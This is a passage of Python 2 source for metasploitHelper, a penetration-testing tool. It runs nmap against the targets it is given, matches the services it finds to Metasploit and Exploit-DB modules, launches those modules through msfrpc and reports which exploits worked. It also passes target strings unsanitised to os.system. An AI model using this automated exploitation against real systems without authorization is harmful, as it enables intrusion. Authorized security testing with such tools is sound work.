       tmpList.append([x[0]+"/"+x[1],"",""])
     if len(portNo)>0 and len(portName)>0 and len(portDesc)>0:
      if [portNo,portName,portDesc[0:80]] not in tmpList:
       tmpList.append([portNo,portName,portDesc[0:80]])
    except requests.exceptions.ConnectTimeout:
     continue
   if len(tmpList)>0 and portInfo==True:
    print "\n**** Port Description ****"
    print tabulate(tmpList, headers=["Port No","Service","Port Description"])

def runMain():
 global autoExpListExp
 global autoExpListAux

 try:
	vulnURLList=[]
	tmpModuleList1=[]
	tmpModuleList=pullMSF()
	tmpModuleList2=tmpModuleList
	for x in tmpModuleList:
	 module = x[1]
         if filterModuleName(module)==True:
	  tmpModuleList1.append(module)

	compareList1=[]
	missingModuleListFromDB=[]

        for x in allPortModuleList:
	 compareList1.append(x[2])

        for x in tmpModuleList2:
	 if x[1] not in compareList1:
	  missingModuleListFromDB.append(x)

        for x in portsList:
         targetList.append(x)

	runPortBasedModules()
	runServiceBasedModules()

	print "\n"
        print "[*] "+str(len(httpList))+" HTTP servers detected"
        print "[*] "+str(len(httpsList))+" HTTPs servers detected"

	if len(httpList)>0:
 	 print "\n[*] List of HTTP Servers"
	 for x in httpList:
		print x[0]+":"+x[1]
	if len(httpsList)>0:
	 print "\n[*] List of HTTPs Servers"
	 for x in httpsList:
		print x[0]+":"+x[1]

	runWebBasedModules()
	runExploitDBModules()

 	message="\n**** List of Working Metasploit Modules ****"
	print(setColor(message, bold, color="red"))
	if len(workingExploitList)>0:
 	 print tabulate(workingExploitList, headers=["Host","Module"])
        else:
         print "No results found"
        print "\n"
	killMSF()
        if len(nmapFilename)>0:
         print "Nmap file saved as: "+nmapFilename+".nmap"
	killMSF()
 except KeyboardInterrupt:
	killMSF()

def readDB():
 conn = sqlite3.connect(os.getcwd()+"/msfHelper.db")
 conn.text_factory = str
 cur=conn.execute("SELECT portNo, moduleType, moduleName, moduleParameters, moduleDescription from portList")
 all_rows = cur.fetchall()
 for row in all_rows:
  portNo=row[0]
  moduleType=row[1]
  moduleName=row[2]
  moduleParameters=row[3]
  moduleDescription=row[4]
  if portNo not in allPortList:
   allPortList.append(portNo)
  if [portNo,moduleType,moduleName,moduleParameters,moduleDescription] not in allPortModuleList:
   allPortModuleList.append([portNo,moduleType,moduleName,moduleParameters,moduleDescription])
 conn = sqlite3.connect(os.getcwd()+"/msfHelper.db")
 conn.text_factory = str
 cur=conn.execute("SELECT uriPath, moduleType, moduleName, moduleParameters, moduleDescription from pathList")
 all_rows = cur.fetchall()
 for row in all_rows:
  uriPath=row[0]
  moduleType=row[1]
  moduleName=row[2]
  moduleParameters=row[3]
  moduleDescription=row[4]
  if uriPath not in allPathList and uriPath!="/":
   allPathList.append(uriPath)
  if [uriPath,moduleType,moduleName,moduleParameters,moduleDescription] not in allPathModuleList:
   allPathModuleList.append([uriPath,moduleType,moduleName,moduleParameters,moduleDescription])

def readExploitDB():
 tmpResultlist=[]
 conn = sqlite3.connect(os.getcwd()+"/msfHelper.db")
 conn.text_factory = str
 cur=conn.execute("SELECT filename,pathName,url,category from exploitDB")
 all_rows = cur.fetchall()
 for row in all_rows:
  filename=row[0]
  pathName=row[1]
  url=row[2]
  category=row[3]
  if pathName!="/":
   tmpResultlist.append([filename,pathName,url,category])
 return tmpResultlist

def runNmap(targetIP):
 print setColor('[*] Running Nmap against target: '+targetIP, bold, color="red")
 portStr=''
 count=0
 #if len(allPortList):
 # print "[!] Please run msfHelper.py -u beforec continuing"
 # sys.exit()
 if portsInput!="":
  portStr=portsInput
 else:
  for x in allPortList:
   portStr+=x
   if count<len(allPortList)-1:
    portStr+=','
   count+=1
 basename = "nmap_"
 suffix = datetime.datetime.now().strftime("%y%m%d_%H%M%S")
 filename = "_".join([basename, suffix])
 nmapFilename=filename
 cmd=''
 if scanAll==True:
  cmd = "nmap -O --max-retries 3 -T4 -n -Pn --open -sT -sV --top-ports 65535 "+targetIP+" -oA "+filename
 else:
  cmd = "nmap -O --max-retries 3 -T4 -n -Pn --open -sT -sV -p "+portStr+" "+targetIP+" -oA "+filename
 os.system(cmd)
 return filename

def runNmapList(inputFilename):
 print setColor("[*] Running Nmap against targets", bold, color="red")
 portStr=''
 count=0
 if portsInput!="":
  portStr=portsInput
 else:
  for x in allPortList:
   portStr+=x
   if count<len(allPortList)-1:
    portStr+=','
   count+=1
 basename = "nmap_"
 suffix = datetime.datetime.now().strftime("%y%m%d_%H%M%S")
 filename = "_".join([basename, suffix])
 cmd=''
 if scanAll==True:
  cmd = "nmap -O --max-retries 3 -T4 -n -Pn --open -sT -sV --top-ports 65535 -iL "+inputFilename+" -oA "+filename
 else:
  cmd = "nmap -O --max-retries 3 -T4 -n -Pn --open -sT -sV -p "+portStr+" -iL "+inputFilename+" -oA "+filename
 os.system(cmd)
 return filename

def testMsfConnection():
  opts={}
  opts['host']='127.0.0.1'
  opts['port']=msfPort
  opts['uri']='/api/'
  opts['ssl']=False
  client = msfrpc.Msfrpc(opts)

  try:
   client.login('msf', mypassword)
  except Exception as e:
    print e
    if 'Authentication failed' in str(e):
     print "Please check your password"
    else:
     print "[!] Unable to connect to msfrpcd"
     print "Please check if the msfconsole is running on another window"
     print "Remember to run 'load msgrpc Pass=xxxxx'"
  sys.exit()

parser = argparse.ArgumentParser(
	prog='PROG',
	formatter_class=argparse.RawDescriptionHelpFormatter,
	description=('''\
                __ _   _      _
 _ __ ___  ___ / _| | | | ___| |_ __   ___ _ __
| '_ ` _ \/ __| |_| |_| |/ _ \ | '_ \ / _ \ '__|
| | | | | \__ \  _|  _  |  __/ | |_) |  __/ |
|_| |_| |_|___/_| |_| |_|\___|_| .__/ \___|_|
                               |_|

+-- https://github.com/milo2012/metasploitHelper

'''))

parser.add_argument("target", nargs='*', type=str, help="The target IP(s), range(s), CIDR(s), hostname(s), FQDN(s) or file(s) containg a list of targets")
parser.add_argument("-P", type=str, dest="mypassword", help="Password to connect to msfrpc")
parser.add_argument("-p", type=str, dest="portsInput", help="Only scan specific TCP ports")
parser.add_argument("-i", action='store_true', help="Intelligent mode (Match the Nmap service banner with the Metasploit modules")
parser.add_argument("-m", "--manual", action='store_true', help="Manually start up Msfconsole and 'load msgrpc Pass=xxxx'")
parser.add_argument("-a", "--scanall", action='store_true', help="Scan all 65535 TCP ports")
parser.add_argument("-n", type=str, dest="threads", default=3, help="Set how many concurrent threads to use (default: 5)")
parser.add_argument("-u", "--update", action='store_true', help="Update Metasploit and metasploitHelper DB")
parser.add_argument("-q", "--quick", action='store_true', help="Performs a quick scan - Do not use modules where TARGETURI is set to /")
parser.add_argument("--info", action='store_true', help="Lookup information about ports online")
parser.add_argument("-v", "--verbose", action='store_true', help="Verbose mode")
parser.add_argument("-s", "--showonly", action='store_true', help="Show matching Metasploit modules but don't run")
cgroup = parser.add_argument_group("Whether to run Metasploit 'services', 'ports', 'web' modules or 'exploitdb'", "Options for executing commands")
cgroup.add_argument("-e", "--exec-method", choices={"all", "services", "ports", "web", "exploitdb"}, default="all", help="")
if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
args = parser.parse_args()
if not os.path.exists("/usr/share/metasploit-framework"):
 print "[!] Metasploit Framework cannot be found at the location /usr/share/metasploit-framework"
 sys.exit()

#testMsfConnection()
localIP=get_ip_address()
if args.info:
 portInfo=True
if args.i:
 intelligentMode=True
if args.exec_method:
 execMethod=args.exec_method
if args.threads:
 numOfThreads=int(args.threads)
if args.manual:
 manualStart=True
if args.portsInput:
 portsInput=args.portsInput
if args.scanall:
 scanAll=True
if checkInternetAccess()==True:
 internetUp=True
else:
 internetUp=False

if args.mypassword:
 mypassword=(args.mypassword).strip()
else:
 if args.manual:
  print "[!] Please enter a password if you are using the -m option"
 else:
  mypassword=generatePassword()
killMSF()
time.sleep(1)
if manualStart==False:
 startMSF()
if not os.path.exists(os.getcwd()+"/msfHelper.db"):
 createDB()
 blankDB=True
 print "[*] Running msfupdate"
 updateMSF()

#tmpModuleList=pullMSF()
if args.update:
  print "[*] Running msfupdate"
  updateMSF()
  if blankDB!=True:
   tmpModuleList=pullMSF()
   updateDB(tmpModuleList)

if len(args.target)<1:
 print "[!] Please set a target"
 sys.exit()

if blankDB==True:
 tmpModuleList=pullMSF()
 updateDB(tmpModuleList)

#Read sqlite3 file for data obtained from Metasploit
print "[*] Reading from msfHelper.db"
readDB()

for target in args.target:
 if os.path.exists(target):
  if target.endswith(".xml"):
   portsList,httpsList,httpList,osList=parseNmap(target)
   tmpList=[]
   tmpList1=[]
   for x in portsList:
    if [x[1],x[2]] not in tmpList1:
     tmpList1.append([x[1],x[2]])
   if len(tmpList1)>0:
    if portInfo==True:
     displayPortInfo(tmpList1)
   else:
    print setColor('[*] Error encountered!', bold, color="red")
    print "[!] No open ports found.  Please check your target IPs"
    sys.exit()
  else:
   filename=target
   nmapFilename=runNmapList(filename)
   portsList,httpsList,httpList,osList=parseNmap(nmapFilename+".xml")
   tmpList=[]
   tmpList1=[]
   for x in portsList:
    if [x[1],x[2]] not in tmpList1:
     tmpList1.append([x[1],x[2]])
   if len(tmpList1)>0:
    if portInfo==True:
     displayPortInfo(tmpList1)
   else:
    print setColor('[*] Error encountered!', bold, color="red")
    print "[!] No open ports found.  Please check your target IPs"
    sys.exit()
 else:
  nmapFilename=runNmap(target)
  portsList,httpsList,httpList,osList=parseNmap(nmapFilename+".xml")
  tmpList=[]
  tmpList1=[]
  for x in portsList:
   if [x[1],x[2]] not in tmpList1:
    tmpList1.append([x[1],x[2]])
  if len(tmpList1)>0:
   displayPortInfo(tmpList1)
  else:
   print setColor('[*] Error encountered!', bold, color="red")
   print "[!] No open ports found.  Please check your target IPs"
   sys.exit()

while isOpen(msfIP,msfPort)==False:
 time.sleep(1)
if args.quick:
 quickMode=True
 if not args.manual:
  print "[!] You need to use the -q and -m options together"
  sys.exit()
if args.info:
 portInfo=True
if args.showonly:
 showOnly=True
if args.verbose:
 verbose=True
time.sleep(1)
runMain()
